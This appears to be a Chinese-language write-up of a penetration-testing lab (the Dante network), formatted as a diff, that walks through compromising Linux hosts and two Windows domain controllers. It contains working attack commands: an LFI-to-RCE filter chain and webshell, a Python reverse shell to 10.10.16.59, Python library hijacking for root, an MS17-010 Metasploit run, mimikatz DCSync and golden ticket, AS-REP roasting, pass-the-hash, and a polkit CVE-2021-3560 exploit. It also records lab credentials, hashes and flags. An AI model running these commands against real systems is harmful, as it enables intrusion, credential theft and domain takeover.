+proxychains smbclient //172.16.1.10/SlackMigration -U james%Toyota -c &#x27;ls&#x27;proxychains smbclient //172.16.1.17/forensics -U administrator%pass@123 -c &#x27;ls&#x27;
+
+
+  
+
+
+分别发现admintasks.txt，monitor
+下载下来：
+proxychains smbclient //172.16.1.10/SlackMigration -U james%Toyota -c &#x27;get admintasks.txt&#x27;proxychains smbclient //172.16.1.17/forensics -U administrator%pass@123 -c &#x27;get monitor&#x27;
+
+
+
+
+从 Web 根目录移除 WordPress 安装 —— 待处理
+恢复 Ubuntu 机器上的 Slack 集成 —— 待处理
+移除旧员工账户 —— 已完成
+通知 Margaret 新的变更 —— 已完成
+移除 Margaret 账户在晋升为管理员后的权限限制 —— 待处理
+
+说明：****存在共享 **&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;SlackMigration&lt;/font&gt;**与Slack有关，Margaret 账户 已被提升为管理员
+monitor文件用wireshark打开
+发现用户名密码
+
+
+
+
+
+admin&#x2F;password6543
+admin&#x2F;Password6543
+
+之前的**其他站点存在本地文件包含（LFI）漏洞还没用**
+Linux: 172.16.1.10挂代理访问 http://172.16.1.10/,存在文件包含
+
+ 
+路径穿越拿到etc&#x2F;passwd
+发现两个关键用户：
+
+**&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;frank&lt;/font&gt;**（普通用户，bash）
+**&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;margaret&lt;/font&gt;**（高权限）
+
+margaret目录可直接访问，有flag
+
+
+flag4：DANTE{LF1_M@K3s_u5_lol} 
+文件包含读到源码
+http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=../../../../../../../../../var/www/html/wordpress/index.php
+
+&lt;?php/** * Front to the WordPress application. This file doesn&#x27;t do anything, but loads * wp-blog-header.php which does and tells WordPress to load the theme. * * @package WordPress *//** * Tells WordPress to load the WordPress theme and output it. * * @var bool */define( &#x27;WP_USE_THEMES&#x27;, true );/** Loads the WordPress Environment and Template */require __DIR__ . &#x27;/wp-blog-header.php&#x27;;
+
+ 现在是要拿shell，尝试文件包含转rce,常见的方法都试了，不太行
+ 利用文件包含转rce的工具filter chain 
+ 生成一个执行系统命令的 webshell  
+python3 php_filter_chain_generator.py --chain &#x27;&lt;?php system($_POST[&quot;0&quot;]); ?&gt;&#x27;
+
+
+
+proxychains curl -X POST &quot;http://172.16.1.10/nav.php?page=你的filter_chain/resource=php://temp&quot; -d &quot;0=id&quot;
+
+但是没回显，将命令执行结果写入文件
+
+
+可以，那就写入shell
+# 生成一句话木马 base64：PD9waHAgZXZhbCgkX1BPU1RbInBhc3MiXSk7ID8+PAYLOAD=$(python3 php_filter_chain_generator.py --chain &#x27;&lt;?php file_put_contents(&quot;/var/www/html/shell.php&quot;, base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbInBhc3MiXSk7ID8+&quot;)); ?&gt;&#x27; | tail -1)# 写入proxychains curl -s -X POST &quot;http://172.16.1.10/nav.php?page=$PAYLOAD&quot; -d &quot;0=echo &#x27;&lt;?php eval(\\$\_POST\[pass\]);?&gt;&#x27; &gt; /var/www/html/shell.php&quot;# 验证proxychains curl -s -X POST &quot;http://172.16.1.10/shell.php&quot; -d &quot;pass=phpinfo();&quot; | head -10
+
+但是payload太长了，不行，回显写文件里
+当前目录
+
+
+wordpress目录
+
+
+
+
+想看wp-config.php，直接读不行，用文件包含读
+
+
+解码：
+&lt;?php/** * The base configuration for WordPress * * The wp-config.php creation script uses this file during the * installation. You don&#x27;t have to use the web site, you can * copy this file to &quot;wp-config.php&quot; and fill in the values. * * This file contains the following configurations: * * * MySQL settings * * Secret keys * * Database table prefix * * ABSPATH * * @link https://wordpress.org/support/article/editing-wp-config-php/ * * @package WordPress */// ** MySQL settings - You can get this info from your web host ** ///** The name of the database for WordPress */define( &#x27;DB_NAME&#x27; &#x27;wordpress&#x27; );/** MySQL database username */define( &#x27;DB_USER&#x27;, &#x27;margaret&#x27; );/** MySQL database password */define( &#x27;DB_PASSWORD&#x27;, &#x27;Welcome1!2@3#&#x27; );/** MySQL hostname */define( &#x27;DB_HOST&#x27;, &#x27;localhost&#x27; );/** Database Charset to use in creating database tables. */define( &#x27;DB_CHARSET&#x27;, &#x27;utf8&#x27; );/** The Database Collate type. Don&#x27;t change this if in doubt. */define( &#x27;DB_COLLATE&#x27;, &#x27;&#x27; );/**#@+ * Authentication Unique Keys and Salts. * * Change these to different unique phrases! * You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125; * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again. * * @since 2.6.0 */define( &#x27;AUTH_KEY&#x27;,         &#x27;put your unique phrase here&#x27; );define( &#x27;SECURE_AUTH_KEY&#x27;,  &#x27;put your unique phrase here&#x27; );define( &#x27;LOGGED_IN_KEY&#x27;,    &#x27;put your unique phrase here&#x27; );define( &#x27;NONCE_KEY&#x27;,        &#x27;put your unique phrase here&#x27; );define( &#x27;AUTH_SALT&#x27;,        &#x27;put your unique phrase here&#x27; );define( &#x27;SECURE_AUTH_SALT&#x27;, &#x27;put your unique phrase here&#x27; );define( &#x27;LOGGED_IN_SALT&#x27;,   &#x27;put your unique phrase here&#x27; );define( &#x27;NONCE_SALT&#x27;,       &#x27;put your unique phrase here&#x27; );/**#@-*//** * WordPress Database Table prefix. * * You can have multiple installations in one database if you give each * a unique prefix. Only numbers, letters, and underscores please! */$table_prefix = &#x27;wp_&#x27;;/** * For developers: WordPress debugging mode. * * Change this to true to enable the display of notices during development. * It is strongly recommended that plugin and theme developers use WP_DEBUG * in their development environments. * * For information on other constants that can be used for debugging, * visit the documentation. * * @link https://wordpress.org/support/article/debugging-in-wordpress/ */define( &#x27;WP_DEBUG&#x27;, false );/* That&#x27;s all, stop editing! Happy publishing. *//** Absolute path to the WordPress directory. */if ( ! defined( &#x27;ABSPATH&#x27; ) ) &#123;	define( &#x27;ABSPATH&#x27;, __DIR__ . &#x27;/&#x27; );&#125;/** Sets up WordPress vars and included files. */require_once ABSPATH . &#x27;wp-settings.php&#x27;;
+
+找到高权限用户margaret的密码 Welcome1!2@3#  
+接下来：反弹 shell → su margaret → 提权
+之前 bash 反弹没反应，换 python 反弹，靶机肯定有 python：
+开监听
+nc -lvnp 8888
+
+执行 python 反弹
+PAYLOAD=$(python3 php_filter_chain_generator.py --chain &#x27;&lt;?php system($_POST[0]);?&gt;&#x27; | tail -1)
+
+proxychains curl -s -X POST &quot;http://172.16.1.10/nav.php?page=$PAYLOAD&quot; -d &quot;0=python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.10.16.59\&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#x27; &amp;&quot;
+
+拿到 shell 后切换 margaret
+
+
+# 先升级交互 shellpython3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;export TERM=xterm# Ctrl+Z 挂起，然后输入：stty raw -echo; fg# 回车两次# 切换 margaretsu margaret# 密码：Welcome1!2@3#
+
+
+
+ 受限 shell，用 vim 直接逃逸  
+先进入 vim，然后设置 shell 为 sh
+第 1 步：在 margaret 的受限 shell 里输入：vim回车，进入 vim。第 2 步：按一下 **Esc** 键（确保不在输入模式）。第 3 步：输入冒号 :，你会看到底部出现 `:` 提示符，然后输入：set shell=/bin/sh回车。第 4 步*：再按冒号:`，输入 shell回车。
+
+
+
+但是这个flag之前已经拿到了
+发现slack
+
+
+之前的待办提示：
+
+
+想利用Slack
+
+
+有frank目录，没有权限，要提全
+
+
+
+
+有提权脚本
+:::info Python 库劫持  ：
+原理：Python 导入模块时，搜索顺序是：
+
+当前目录（脚本所在目录 &#x2F; 执行时的工作目录）
+PYTHONPATH 环境变量指定的目录
+标准库目录
+
+如果我们在优先搜索路径里放一个同名的恶意 urllib.py 或 call.py，脚本就会加载我们的恶意代码，并且以 root 权限执行。
+:::
+但是当前用户是 margaret  没权限写
+信息收集，找到frank的下载文件
+
+
+
+
+在 secure&#x2F;2020-05-18.json中找到密码frank&#x2F;69F15HST1CX，但是有加密，再原始路径找到
+cat ~/.config/Slack/exported_data/secure/2020-05-18.json
+
+frank 密码 TractorHeadtorchDeskmat
+
+
+验证
+
+
+用frank身份写恶意 urllib.py
+在 frank 的 shell 里执行：
+echo &#x27;import os; os.system(&quot;chmod u+s /bin/bash&quot;)&#x27; &gt; /home/frank/urllib.py
+
+验证写进去了
+ls -la /home/frank/urllib.pycat /home/frank/urllib.py
+
+然后等 cron 任务执行后检查：
+ls -la /bin/bash
+
+如果权限变成 -rwsr-xr-x
+提权 root
+bash -pid
+
+
+
+
+
+flag5：DANTE{L0v3_m3_S0m3_H1J4CK1NG_XD}
+当前是在172.16.1.10 是DANTE-NIX02
+之前fscan
+Linux:172.16.1.17
+
+
+172.16.1.17
+DANTE-NIX03
+80, 139, 445, 10000
+SMB 认证成功 &lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;administrator:P@ssword123&lt;/font&gt;，运行 Webmin
+
+
+
+http://172.16.1.17:10000/  
+
+
+172.16.1.17:80
+
+
+
+
+#!/usr/bin/perl# Display all Webmin modules visible to the current userBEGIN &#123; push(@INC, &quot;.&quot;); &#125;;use WebminCore;&amp;init_config();&amp;ReadParse();$hostname = &amp;get_display_hostname();$ver = &amp;get_webmin_version();&amp;get_miniserv_config(\%miniserv);if ($gconfig&#123;&#x27;real_os_type&#x27;&#125;) &#123;	if ($gconfig&#123;&#x27;os_version&#x27;&#125; eq &quot;*&quot;) &#123;		$ostr = $gconfig&#123;&#x27;real_os_type&#x27;&#125;;		&#125;	else &#123;		$ostr = &quot;$gconfig&#123;&#x27;real_os_type&#x27;&#125; $gconfig&#123;&#x27;real_os_version&#x27;&#125;&quot;;		&#125;	&#125;else &#123;	$ostr = &quot;$gconfig&#123;&#x27;os_type&#x27;&#125; $gconfig&#123;&#x27;os_version&#x27;&#125;&quot;;	&#125;%access = &amp;get_module_acl();# Build a list of all modules@modules = &amp;get_visible_module_infos();if (!defined($in&#123;&#x27;cat&#x27;&#125;)) &#123;	# Maybe redirect to some module after login	local $goto = &amp;get_goto_module(\@modules);	if ($goto) &#123;		&amp;redirect($goto-&gt;&#123;&#x27;dir&#x27;&#125;.&#x27;/&#x27;);		exit;		&#125;	&#125;$gconfig&#123;&#x27;sysinfo&#x27;&#125; = 0 if ($gconfig&#123;&#x27;sysinfo&#x27;&#125; == 1);if ($gconfig&#123;&#x27;texttitles&#x27;&#125;) &#123;	@args = ( $text&#123;&#x27;main_title2&#x27;&#125;, undef );	&#125;else &#123;	@args = ( $gconfig&#123;&#x27;nohostname&#x27;&#125; ? $text&#123;&#x27;main_title2&#x27;&#125; :		    &amp;text(&#x27;main_title&#x27;, $ver, $hostname, $ostr),		  &quot;images/webmin-blue.png&quot; );	if ($gconfig&#123;&#x27;showlogin&#x27;&#125;) &#123;		$args[0] = $remote_user.&quot; : &quot;.$args[0];		&#125;	&#125;&amp;header(@args, undef, undef, 1, 1,	$tconfig&#123;&#x27;brand&#x27;&#125; ? 	&quot;&lt;a href=$tconfig&#123;&#x27;brand_url&#x27;&#125;&gt;$tconfig&#123;&#x27;brand&#x27;&#125;&lt;/a&gt;&quot; :	$gconfig&#123;&#x27;brand&#x27;&#125; ? 	&quot;&lt;a href=$gconfig&#123;&#x27;brand_url&#x27;&#125;&gt;$gconfig&#123;&#x27;brand&#x27;&#125;&lt;/a&gt;&quot; :	&quot;&lt;a href=http://www.webmin.com/&gt;$text&#123;&#x27;main_homepage&#x27;&#125;&lt;/a&gt;&quot;	);print &quot;&lt;center&gt;&lt;font size=+1&gt;&quot;,    &amp;text(&#x27;main_version&#x27;, $ver, $hostname, $ostr),&quot;&lt;/font&gt;&lt;/center&gt;\n&quot;	if (!$gconfig&#123;&#x27;nohostname&#x27;&#125;);print &quot;&lt;hr id=&#x27;header_hr&#x27;&gt;&lt;p&gt;\n&quot;;print $text&#123;&#x27;main_header&#x27;&#125;;if (!@modules) &#123;	# use has no modules!	print &quot;&lt;p class=&#x27;main_none&#x27;&gt;&lt;b&gt;$text&#123;&#x27;main_none&#x27;&#125;&lt;/b&gt;&lt;p&gt;\n&quot;;	&#125;elsif ($gconfig&#123;&quot;notabs_$&#123;base_remote_user&#125;&quot;&#125; == 2 ||    $gconfig&#123;&quot;notabs_$&#123;base_remote_user&#125;&quot;&#125; == 0 &amp;&amp; $gconfig&#123;&#x27;notabs&#x27;&#125;) &#123;	# Generate main menu with all modules on one page	print &quot;&lt;center&gt;&lt;table id=&#x27;mods&#x27; cellpadding=5 cellspacing=0 width=100%&gt;\n&quot;;	$pos = 0;	$cols = $gconfig&#123;&#x27;nocols&#x27;&#125; ? $gconfig&#123;&#x27;nocols&#x27;&#125; : 4;	$per = 100.0 / $cols;	foreach $m (@modules) &#123;		if ($pos % $cols == 0) &#123; print &quot;&lt;tr $cb&gt;\n&quot;; &#125;		print &quot;&lt;td valign=top align=center width=$per\%&gt;\n&quot;;		local $idx = $m-&gt;&#123;&#x27;index_link&#x27;&#125;;		print &quot;&lt;table border&gt;&lt;tr&gt;&lt;td&gt;&lt;a href=$gconfig&#123;&#x27;webprefix&#x27;&#125;/$m-&gt;&#123;&#x27;dir&#x27;&#125;/$idx&gt;&quot;,		      &quot;&lt;img src=$m-&gt;&#123;&#x27;dir&#x27;&#125;/images/icon.gif border=0 &quot;,		      &quot;width=48 height=48&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n&quot;;		print &quot;&lt;a href=$gconfig&#123;&#x27;webprefix&#x27;&#125;/$m-&gt;&#123;&#x27;dir&#x27;&#125;/$idx&gt;$m-&gt;&#123;&#x27;desc&#x27;&#125;&lt;/a&gt;&lt;/td&gt;\n&quot;;		if ($pos % $cols == $cols - 1) &#123; print &quot;&lt;/tr&gt;\n&quot;; &#125;		$pos++;		&#125;	print &quot;&lt;/table&gt;&lt;/center&gt;&lt;p&gt;&lt;hr id=&#x27;mods_hr&#x27;&gt;\n&quot;;	&#125;else &#123;	# Display under categorised tabs	&amp;ReadParse();	%cats = &amp;list_categories(\@modules);	@cats = sort &#123; $b cmp $a &#125; keys %cats;	$cats = @cats;	$per = $cats ? 100.0 / $cats : 100;	if (!defined($in&#123;&#x27;cat&#x27;&#125;)) &#123;		# Use default category		if (defined($gconfig&#123;&#x27;deftab&#x27;&#125;) &amp;&amp;		    &amp;indexof($gconfig&#123;&#x27;deftab&#x27;&#125;, @cats) &gt;= 0) &#123;			$in&#123;&#x27;cat&#x27;&#125; = $gconfig&#123;&#x27;deftab&#x27;&#125;;			&#125;		else &#123;			$in&#123;&#x27;cat&#x27;&#125; = $cats[0];			&#125;		&#125;	elsif (!$cats&#123;$in&#123;&#x27;cat&#x27;&#125;&#125;) &#123;		$in&#123;&#x27;cat&#x27;&#125; = &quot;&quot;;		&#125;	print &quot;&lt;table id=&#x27;cattabs&#x27; border=0 cellpadding=0 cellspacing=0 height=20&gt;&lt;tr&gt;\n&quot;;	$usercol = defined($gconfig&#123;&#x27;cs_header&#x27;&#125;) ||		   defined($gconfig&#123;&#x27;cs_table&#x27;&#125;) ||		   defined($gconfig&#123;&#x27;cs_page&#x27;&#125;);	foreach $c (@cats) &#123;		$t = $cats&#123;$c&#125;;		if ($in&#123;&#x27;cat&#x27;&#125; eq $c) &#123;			print &quot;&lt;td class=&#x27;usercoll&#x27; valign=top $cb&gt;&quot;, $usercol ? &quot;&lt;br&gt;&quot; :			  &quot;&lt;img src=images/lc2.gif alt=\&quot;\&quot;&gt;&quot;,&quot;&lt;/td&gt;\n&quot;;			print &quot;&lt;td class=&#x27;usercolc&#x27; id=&#x27;selectedcat&#x27; $cb&gt;&amp;nbsp;&lt;b&gt;$t&lt;/b&gt;&amp;nbsp;&lt;/td&gt;\n&quot;;			print &quot;&lt;td class=&#x27;usercolr&#x27; valign=top $cb&gt;&quot;, $usercol ? &quot;&lt;br&gt;&quot; :			  &quot;&lt;img src=images/rc2.gif alt=\&quot;\&quot;&gt;&quot;,&quot;&lt;/td&gt;\n&quot;;			&#125;		else &#123;			print &quot;&lt;td class=&#x27;usercoll&#x27; valign=top $tb&gt;&quot;, $usercol ? &quot;&lt;br&gt;&quot; :			  &quot;&lt;img src=images/lc1.gif alt=\&quot;\&quot;&gt;&quot;,&quot;&lt;/td&gt;\n&quot;;			print &quot;&lt;td class=&#x27;usercolc&#x27; $tb&gt;&amp;nbsp;&quot;,			      &quot;&lt;a href=$gconfig&#123;&#x27;webprefix&#x27;&#125;/?cat=$c&gt;&lt;b&gt;$t&lt;/b&gt;&lt;/a&gt;&amp;nbsp;&lt;/td&gt;\n&quot;;			print &quot;&lt;td class=&#x27;usercolr&#x27; valign=top $tb&gt;&quot;, $usercol ? &quot;&lt;br&gt;&quot; :			  &quot;&lt;img src=images/rc1.gif alt=\&quot;\&quot;&gt;&quot;,&quot;&lt;/td&gt;\n&quot;;			&#125;		print &quot;&lt;td width=10&gt;&lt;/td&gt;\n&quot;;		&#125;	print &quot;&lt;/tr&gt;&lt;/table&gt; &lt;table id=&#x27;mods&#x27; border=0 cellpadding=0 cellspacing=0 &quot;,              &quot;width=100% $cb&gt;\n&quot;;	print &quot;&lt;tr&gt;&lt;td&gt;&lt;table width=100% cellpadding=5&gt;\n&quot;;	# Display the modules in this category	$pos = 0;	$cols = $gconfig&#123;&#x27;nocols&#x27;&#125; ? $gconfig&#123;&#x27;nocols&#x27;&#125; : 4;	$per = 100.0 / $cols;	foreach $m (@modules) &#123;		next if ($m-&gt;&#123;&#x27;category&#x27;&#125; ne $in&#123;&#x27;cat&#x27;&#125;);		if ($pos % $cols == 0) &#123; print &quot;&lt;tr&gt;\n&quot;; &#125;		local $idx = $m-&gt;&#123;&#x27;index_link&#x27;&#125;;		print &quot;&lt;td valign=top align=center width=$per\%&gt;\n&quot;;		print &quot;&lt;table border bgcolor=#ffffff&gt;&lt;tr&gt;&lt;td&gt;&lt;a href=$gconfig&#123;&#x27;webprefix&#x27;&#125;/$m-&gt;&#123;&#x27;dir&#x27;&#125;/$idx&gt;&quot;,		      &quot;&lt;img src=$m-&gt;&#123;&#x27;dir&#x27;&#125;/images/icon.gif alt=\&quot;\&quot; border=0&gt;&lt;/a&gt;&quot;,		      &quot;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n&quot;;		print &quot;&lt;a href=$gconfig&#123;&#x27;webprefix&#x27;&#125;/$m-&gt;&#123;&#x27;dir&#x27;&#125;/$idx&gt;$m-&gt;&#123;&#x27;desc&#x27;&#125;&lt;/a&gt;&lt;/td&gt;\n&quot;;		if ($pos++ % $cols == $cols - 1) &#123; print &quot;&lt;/tr&gt;\n&quot;; &#125;		&#125;	while($pos++ % $cols) &#123;		print &quot;&lt;td width=$per\%&gt;&lt;/td&gt;\n&quot;;		&#125;	print &quot;&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p&gt;&lt;hr id=&#x27;mods_hr&#x27;&gt;\n&quot;;	&#125;# Check for incorrect OSif (&amp;foreign_check(&quot;webmin&quot;)) &#123;	&amp;foreign_require(&quot;webmin&quot;, &quot;webmin-lib.pl&quot;);	&amp;webmin::show_webmin_notifications();	&#125;if ($miniserv&#123;&#x27;logout&#x27;&#125; &amp;&amp;    !$ENV&#123;&#x27;SSL_USER&#x27;&#125; &amp;&amp; !$ENV&#123;&#x27;LOCAL_USER&#x27;&#125; &amp;&amp; !$ENV&#123;&#x27;ANONYMOUS_USER&#x27;&#125; &amp;&amp;    $ENV&#123;&#x27;HTTP_USER_AGENT&#x27;&#125; !~ /webmin/i) &#123;	print &quot;&lt;table id=&#x27;altlogout&#x27; width=100% cellpadding=0 cellspacing=0&gt;&lt;tr&gt;\n&quot;;	if ($main::session_id) &#123;		print &quot;&lt;td align=right&gt;&lt;a href=&#x27;session_login.cgi?logout=1&#x27;&gt;&quot;,		      &quot;$text&#123;&#x27;main_logout&#x27;&#125;&lt;/a&gt;&lt;/td&gt;\n&quot;;		&#125;	else &#123;		print &quot;&lt;td align=right&gt;&lt;a href=switch_user.cgi&gt;&quot;,		      &quot;$text&#123;&#x27;main_switch&#x27;&#125;&lt;/a&gt;&lt;/td&gt;\n&quot;;		&#125;	print &quot;&lt;/tr&gt;&lt;/table&gt;\n&quot;;	&#125;print $text&#123;&#x27;main_footer&#x27;&#125;;&amp;footer();
+
+
+
+之前wireshack找到一个http://172.16.1.17:10000/  的密码，登录
+
+
+
+ 
+
+
+flag6：DANTE{SH4RKS_4R3_3V3RYWHERE}
+Windows DC01 域控 :172.16.1.20fscan ：发现漏洞 172.16.1.20 MS17-010
+因为代理，所以 bind_tcp 正向 payload  
+use exploit/windows/smb/ms17_010_psexecset RHOSTS 172.16.1.20set RPORT 445set PAYLOAD windows/meterpreter/bind_tcpset LPORT 4444set Proxies socks5:127.0.0.1:1080runshell
+
+拿下DC01
+
+
+
+
+flag6:DANTE{Feel1ng_Blu3_or_Zer0_f33lings?}
+下载employee_backup.xlsx
+
+
+用户名	  密码asmith	Princess1smoggat	Summer2019tmodle	P45678!ccraven	Password1kploty	Teacher65jbercov	4567Holiday1whaguey	acb123dcamtan	WorldOfWarcraft67tspadly	RopeBlackfieldForwardslashematlis	JuneJuly1TYfglacdon	FinalFantasy7tmentrso	65RedBalloonsdharding	WestminsterOrange5smillar	MarksAndSparks91bjohnston	Bullingdon1iahmed	Sheffield23plongbottom	PowerfixSaturdayClub777jcarrot	Tanenbaum0001lgesley	SuperStrongCantForget123456789
+
+查看本地用户
+
+
+用户注释
+
+
+mrb3n : S3kur1ty2020!
+flag7:DANTE{1_jusT_c@nt_st0p_d0ing_th1s}
+fscan 扫2段
+
+
+发现二级域控172.16.2.5 DANTE-DC02
+Windows DC02:172.16.2.5拿 域管 NTLM hash  
+ 直接用 meterpreter 的 kiwi 模块抓  
+load kiwicreds_alllsa_dump_samlsa_dump_secrets
+
+
+本地 Administrator NTLM：9bff06fe611486579fb74037890fda96
+DefaultPassword：DishonestSupermanDiablo5679
+域名：DANTE.local
+
+kiwi_cmd lsadump::dcsync /domain:DANTE.local /user:krbtgt
+
+
+krbtgt NTLM：49e6f37ede481d09747f6a0c9abcbaa7
+域 SID：S-1-5-21-2273245918-2602599687-2649756301
+
+黄金票据：
+生成黄金票据并注入内存
+kiwi_cmd kerberos::golden /user:Administrator /domain:DANTE.local /sid:S-1-5-21-2273245918-2602599687-2649756301 /krbtgt:49e6f37ede481d09747f6a0c9abcbaa7 /ptt
+
+不行
+之前的代理是挂在入口机上，现在在DC01上挂一个代理
+Kali → 1080(socks入口) → 入口机 → 172.16.1.0/24 → DC01 → 172.16.2.0/24
+
+利用msf的多级代理：
+sessions -l# 1. 进 DC01 的 session 加路由sessions -i &lt;DC01的sessionID&gt;run autoroute -s 172.16.2.0/24background# 2. 起 socks 代理use auxiliary/server/socks_proxyset SRVPORT 1081run -j# 3. proxychains 配置加 1081# /etc/proxychains4.conf 最后一行改成 socks5 127.0.0.1 1081# 4. 直接扫proxychains nmap -sT -Pn 172.16.2.5 -p 21,22,80,88,135,139,389,443,445,5985,3389
+
+
+
+** **现在要横道DC02上，但是没有对的用户名和密码
+Kerbrute 枚举有效域用户**  **
+
+
+域名DANTE.ADMIN（所以之前的黄金票据不对）
+用已知用用户名密码哈希碰撞
+proxychains impacket-GetNPUsers DANTE.ADMIN/ -dc-ip 172.16.2.5 -usersfile users.txt -format hashcat -outputfile asrep.hash
+
+
+
+$krb5asrep$23$jbercov@DANTE.ADMIN:96b2deaa8922c816b32a9b6cd1ca6c86$a8d65b6eb5543f9be68a7a652d30ac5f398c58920c22ab0048a4b9462a26d11fb8e021d36b5f77e6080576542d9b73f626de6c716bc761e3cba7f7600860e522d58ea8a5252dbc7eae0dfd2608bd35a5fc85e060b2fdf2f6121812e9fd3e4ad12cce0083bfd2a5471a7589807d67a6c5c6c26f1b913ac3b628353e6eda1705d53e16a1350c8f15fe94fa44945a76aad0bb12919e1eb753507d62c6ab3fed4c0ed315e5649e89f8573815e3d09ac599d4a7006f490c8298aca99b64b837b0c952a58bd1948277fa2df8dd7c9c0a32a25e98b9b800c53eec56ac224c75db4a2263485668f1f94453473754
+
+爆破哈希：
+hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
+
+jbercov ： myspace7  
+
+
+用 WinRM 登录 DC02
+proxychains evil-winrm -i 172.16.2.5 -u jbercov -p myspace7
+
+
+
+但是，msf的代理很不稳定，老是断
+重挂一个frp
+Kali(frps服务端) ← DC01(frpc客户端) ← 二级网段 172.16.2.0/24
+
+evil-winrm -i 127.0.0.1 -P 5985 -u jbercov -p myspace7
+
+type C:\Users\jbercov\Desktop\flag.txt
+flag8:DANTE{Im_too_hot_Im_K3rb3r045TinG!}
+提权
+
+
+没找到什么有用信息
+fscan：
+还有一台172.16.2.101
+SharpHound看拓扑：
+
+
+符合 DCSync 权限  ：****
+
+GetChanges
+GetChangesInFilteredSet
+GetChangesAll
+
+说明：
+jbercov 这个账号可以：
+
+假装自己是域控
+向真域控请求复制所有用户的密码哈希
+不用登录域控，不用提权，直接 dump 整个域的所有账号密码
+
+找了一个利用工具 DSInternals.psd1  ，试试
+上传完整的 zipupload /home/echoin/桌面/DSInternals_v7.1.zip解压Expand-Archive -Path .\DSInternals_v7.1.zip -DestinationPath .\DSInternals -Force进到目录里导入cd .\DSInternalsdirImport-Module .\DSInternals.psd1导入成功后直接 dump 哈希Get-ADReplAccount -SamAccountName Administrator -Server 127.0.0.1 -NamingContext &quot;DC=DANTE,DC=ADMIN&quot;
+
+不行，卡最后一步了
+mimikaze：
+.\mimikatz.exe &quot;lsadump::dcsync /domain:DANTE.ADMIN /user:Administrator&quot; &quot;exit&quot;
+
+
+Administrator NTLM: 4c827b7074e99eefd49d05872185f7f8
+域 SID: S-1-5-21-1107894465-4119991344-1603665553
+
+拿到hash了，用哈希登录
+直接用 evil-winrm PTH 登录
+5985 端口 frp 已经转发到本地 5985 了：
+evil-winrm -i 127.0.0.1 -P 5985 -u Administrator -H 4c827b7074e99eefd49d05872185f7f8
+
+
+
+flag9：DANTE{DC_or_Marvel?}
+
+
+
+Note：
+你本应通过枚举 DC01 上的浏览器历史文件来发现这个子网。
+172.16.1.10（NIX02）也可以作为跳板打到这台机子，它可能比 DC01 更稳定一些。
+（确实）
+
+
+
+
+
+Jenkins.bat文件发现一组用户名密码： Admin_129834765 SamsungOctober102030
+Linux:172.16.2.101有22端口
+SSH 爆破   msf
+julian:manchesterunited（找半天都不知道是哪来的，看wp后来才知道是之前拿的员工表有问题）
+
+
+
+
+&#x2F;home&#x2F;julian&#x2F;flag.txt：
+flag10：DANTE{H1ding_1n_th3_c0rner}
+linPEAS :CVE-2021-3560 (Polkit)
+# 1. 创建sudo组用户privesc（利用CVE-2021-3560 polkit竞态条件）# int32:1 = administrator类型 → 自动加入sudo组dbus-send --system --dest=org.freedesktop.Accounts \  --type=method_call --print-reply \  /org/freedesktop/Accounts \  org.freedesktop.Accounts.CreateUser \  string:privesc string:&quot;PrivEsc User&quot; int32:1 &amp;sleep 0.005kill $! 2&gt;/dev/null# 验证创建成功id privesc# uid=1000(privesc) gid=1000(privesc) groups=1000(privesc),27(sudo)# 2. 通过CVE-2021-3560设空密码python3 -c &quot;import subprocess, time, osfor i in range(50):    p = subprocess.Popen([&#x27;dbus-send&#x27;,&#x27;--system&#x27;,&#x27;--dest=org.freedesktop.Accounts&#x27;,        &#x27;--type=method_call&#x27;,&#x27;--print-reply&#x27;,        &#x27;/org/freedesktop/Accounts/User1000&#x27;,        &#x27;org.freedesktop.Accounts.User.SetPassword&#x27;,        &#x27;string:&#x27;,&#x27;string:&#x27;],        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)    time.sleep(0.003)    try: os.kill(p.pid, 9)    except: pass&quot;# 3. 无密码切换 + sudo提rootsu privesc       # 直接回车sudo su          # root
+
+
+
+flag11：DANTE{0verfl0wing_l1k3_craz33!}
+上个fscan,扫一下2段
+root@DANTE-ADMIN-NIX05:~# ./fscan -h 172.16.2.0/24┌──────────────────────────────────────────────┐│    ___                              _        ││   / _ \     ___  ___ _ __ __ _  ___| | __    ││  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    ││ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     ││ \____/     |___/\___|_|  \__,_|\___|_|\_\    │└──────────────────────────────────────────────┘      Fscan Version: 2.0.1     [2.0s]     已选择服务扫描模式                                           [2.0s]     开始信息扫描[2.0s]     CIDR范围: 172.16.2.0-172.16.2.255[2.0s]     generate_ip_range_full[2.0s]     解析CIDR 172.16.2.0/24 -&gt; IP范围 172.16.2.0-172.16.2.255[2.0s]     最终有效主机数量: 256[2.0s]     开始主机扫描[2.0s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle                               [2.0s] [*] 目标 172.16.2.101    存活 (ICMP)[2.0s] [*] 目标 172.16.2.5      存活 (ICMP)[2.0s] [*] 目标 172.16.2.6      存活 (ICMP)[5.0s]     存活主机数量: 3[5.0s]     有效端口数量: 233[5.0s] [*] 端口开放 172.16.2.101:22[5.0s] [*] 端口开放 172.16.2.5:135[5.0s] [*] 